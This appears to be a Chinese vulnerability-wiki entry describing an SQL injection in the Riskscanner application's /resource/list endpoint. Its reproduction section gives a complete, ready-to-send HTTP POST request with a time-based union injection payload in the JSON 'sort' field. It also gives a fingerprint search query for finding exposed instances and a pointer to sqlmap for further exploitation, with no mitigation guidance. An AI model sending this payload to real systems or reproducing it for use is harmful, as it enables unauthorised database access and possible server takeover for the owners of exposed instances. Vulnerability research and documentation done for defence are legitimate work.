---
title: "Riskscanner list SQL注入漏洞"
date: 2026-10-16 09:09:05
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Riskscanner-list"
tags:
  - "Riskscanner-list"
  - "SQL注入"
  - "代码执行"
  - "漏洞复现"
---
## 漏洞描述

Riskscanner list接口存在SQL注入漏洞，通过漏洞可获取服务器权限

## 漏洞影响

```
Riskscanner
```

## 网络测绘

```
title="Riskscanner"
```

## 漏洞复现

登录页面



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101940023.png)



发送漏洞请求包



```plain
POST /resource/list/1/10 HTTP/1.1
Host: 
Content-Length: 41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Content-Type: application/json;charset=UTF-8

{"sort":"1)a union select sleep(5) -- -"}
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101940005.png)



使用工具Sqlmap



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101940424.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Riskscanner-list-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
